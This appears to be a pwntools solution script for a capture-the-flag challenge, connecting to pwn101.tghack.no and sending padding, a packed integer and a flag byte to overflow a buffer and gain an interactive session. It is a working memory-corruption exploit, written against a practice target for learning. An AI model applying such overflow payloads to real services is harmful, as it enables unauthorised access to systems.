from pwn import *

r = remote("pwn101.tghack.no", 1060)

padding = "Marit er bestest" # 16 byte padding
binarydata = p32(25) # Binary data for the 32-bit integer '25'
is_hacker_byte = "\x01" # Hexadecimal representation of '1'

r.sendline(padding + binarydata + is_hacker_byte)
r.recvline()

r.interactive()
